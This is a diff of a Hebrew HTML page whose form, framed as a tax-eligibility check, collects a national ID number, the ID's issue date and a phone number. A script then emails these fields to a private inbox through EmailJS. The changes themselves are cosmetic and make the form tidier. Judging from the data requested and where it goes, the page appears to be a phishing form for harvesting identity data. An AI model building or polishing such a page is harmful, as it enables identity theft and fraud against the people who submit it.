@@ -23,88 +23,23 @@
         animation: waveBg 30s linear infinite;
         z-index:-1;
     }
-    @keyframes waveBg {
-        0%{transform:translate(0,0);}
-        50%{transform:translate(-50px,-50px);}
-        100%{transform:translate(0,0);}
-    }
-    header {
-        background: linear-gradient(270deg,#2E7D32,#4CAF50,#81C784,#43A047);
-        background-size:800% 800%;
-        animation: headerGradient 15s ease infinite;
-        color:white;
-        text-align:center;
-        padding:80px 20px;
-        position:relative;
-        overflow:hidden;
-    }
-    header h1 {
-        font-size:3em;
-        margin-bottom:10px;
-        background: linear-gradient(270deg,#FFEB3B,#FFC107,#FF9800);
-        background-size:800% 800%;
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        animation: textGradient 8s ease infinite;
-    }
+    @keyframes waveBg {0%{transform:translate(0,0);}50%{transform:translate(-50px,-50px);}100%{transform:translate(0,0);}}
+    header {background: linear-gradient(270deg,#2E7D32,#4CAF50,#81C784,#43A047);background-size:800% 800%;animation: headerGradient 15s ease infinite;color:white;text-align:center;padding:80px 20px;position:relative;overflow:hidden;}
+    header h1 {font-size:3em;margin-bottom:10px;background: linear-gradient(270deg,#FFEB3B,#FFC107,#FF9800);background-size:800% 800%;-webkit-background-clip: text;-webkit-text-fill-color: transparent;animation: textGradient 8s ease infinite;}
     header p {font-size:1.3em; animation: fadeIn 2s ease;}
     @keyframes headerGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
     @keyframes textGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
     @keyframes fadeIn {from {opacity:0;} to {opacity:1;}}
-    .popup {
-        display:none;
-        position:fixed;
-        top:50%;
-        left:50%;
-        transform:translate(-50%,-50%);
-        background:white;
-        padding:50px 40px;
-        border-radius:20px;
-        box-shadow:0 15px 40px rgba(0,0,0,0.25);
-        z-index:100;
-        text-align:center;
-        font-size:1.3em;
-        color:#2E7D32;
-        min-width:320px;
-    }
-    .loader {
-        border:6px solid #f3f3f3;
-        border-top:6px solid #4CAF50;
-        border-radius:50%;
-        width:50px;
-        height:50px;
-        margin:20px auto;
-        animation:spin 1s linear infinite;
-    }
+    .popup {display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:50px 40px;border-radius:20px;box-shadow:0 15px 40px rgba(0,0,0,0.25);z-index:100;text-align:center;font-size:1.3em;color:#2E7D32;min-width:320px;}
+    .loader {border:6px solid #f3f3f3;border-top:6px solid #4CAF50;border-radius:50%;width:50px;height:50px;margin:20px auto;animation:spin 1s linear infinite;}
     @keyframes spin {100% {transform:rotate(360deg);}}
-    form {
-        position:relative;
-        display:flex;
-        flex-direction:column;
-        background: linear-gradient(135deg,#fff3e0,#ffe0b2);
-        padding:30px;
-        border-radius:20px;
-        box-shadow:0 10px 25px rgba(0,0,0,0.1);
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
+    form {position:relative;display:flex;flex-direction:column;background: linear-gradient(135deg,#fff3e0,#ffe0b2);padding:30px;border-radius:20px;box-shadow:0 10px 25px rgba(0,0,0,0.1);transition: transform 0.3s ease, box-shadow 0.3s ease;}
     form:hover {transform: translateY(-3px); box-shadow:0 15px 30px rgba(0,0,0,0.12);}
     .form-group {margin-bottom:15px;}
     label {margin-bottom:5px;font-weight:500;display:block;color:#333;}
     input {padding:12px;font-size:1em;border-radius:10px;border:1px solid #ccc;width:100%;}
     input:focus {border-color:#4CAF50;outline:none;box-shadow:0 0 8px rgba(76,175,80,0.4);}
-    button {
-        background: linear-gradient(270deg,#FF9800,#F44336,#FF5722,#FF7043);
-        background-size:400% 400%;
-        color:white;
-        padding:15px;
-        font-size:1.2em;
-        border:none;
-        border-radius:12px;
-        cursor:pointer;
-        margin-top:10px;
-        animation: buttonGradient 5s ease infinite;
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
+    button {background: linear-gradient(270deg,#FF9800,#F44336,#FF5722,#FF7043);background-size:400% 400%;color:white;padding:15px;font-size:1.2em;border:none;border-radius:12px;cursor:pointer;margin-top:10px;animation: buttonGradient 5s ease infinite;transition: transform 0.3s ease, box-shadow 0.3s ease;}
     button:hover {transform: scale(1.08); box-shadow:0 10px 25px rgba(0,0,0,0.2);}
     @keyframes buttonGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
   </style>
@@ -137,7 +72,7 @@
       </div>
       <div class="form-group">
         <label for="id-number">תעודת זהות</label>
-        <input type="text" id="id-number" name="id_number" placeholder="מספר תעודת זהות" required maxlength="9" pattern="[0-9]{9}">
+        <input type="text" id="id-number" name="id_number" placeholder="מספר תעודת זהות" required maxlength="9" pattern="[0-9]{9}" title="תעודת זהות חייבת להכיל 9 ספרות">
       </div>
       <div class="form-group">
         <label for="id-date">תאריך הנפקה של תעודת זהות</label>
@@ -145,7 +80,7 @@
       </div>
       <div class="form-group">
         <label for="phone">נייד</label>
-        <input type="tel" id="phone" name="phone" placeholder="נייד ליצירת קשר" required maxlength="10" pattern="[0-9]{10}">
+        <input type="tel" id="phone" name="phone" placeholder="נייד ליצירת קשר" required maxlength="10" pattern="[0-9]{10}" title="נייד חייב להכיל 10 ספרות">
       </div>
       <button type="submit">בדוק זכאותך</button>
     </form>
@@ -161,33 +96,36 @@
   <div class="loader"></div>
 </div>
 
-<!-- טען את ספריית EmailJS קודם -->
+<!-- EmailJS SDK -->
 <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
 
 <script type="text/javascript">
-  // התחלת ספריית EmailJS עם המפתח הציבורי שלך
-  emailjs.init("t2eGSdp94pjW_SynR");
+document.addEventListener('DOMContentLoaded', function() {
+    // אתחול EmailJS עם המפתח הציבורי
+    emailjs.init("t2eGSdp94pjW_SynR");
 
-  // טיפול בשליחת הטופס
-  document.getElementById('taxForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+    // טיפול בשליחת הטופס
+    const form = document.getElementById('taxForm');
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
 
-    // הצג את הפופ-אפ
-    document.getElementById('popup').style.display = 'block';
+        // הצג את הפופ-אפ
+        document.getElementById('popup').style.display = 'block';
 
-    // שלח את הטופס דרך EmailJS
-    emailjs.sendForm('service_qgukpno', 'template_d7lfkgq', this)
-      .then(function(response) {
-        console.log('SUCCESS', response);
-        alert('הבקשה שלך נקלטה בהצלחה!');
-        document.getElementById('popup').style.display = 'none';
-        document.getElementById('taxForm').reset(); // מנקה את הטופס אחרי שליחה
-      }, function(error) {
-        console.log('FAILED', error);
-        alert('שגיאה בשליחת המייל, נסה שנית');
-        document.getElementById('popup').style.display = 'none';
-      });
-  });
+        // שלח את הנתונים ל-EmailJS
+        emailjs.sendForm('service_qgukpno', 'template_d7lfkgq', this)
+        .then(function(response) {
+            console.log('SUCCESS', response);
+            alert('הבקשה שלך נקלטה בהצלחה!');
+            document.getElementById('popup').style.display = 'none';
+            form.reset();
+        }, function(error) {
+            console.log('FAILED', error);
+            alert('שגיאה בשליחת המייל, נסה שנית');
+            document.getElementById('popup').style.display = 'none';
+        });
+    });
+});
 </script>
 
 </body>
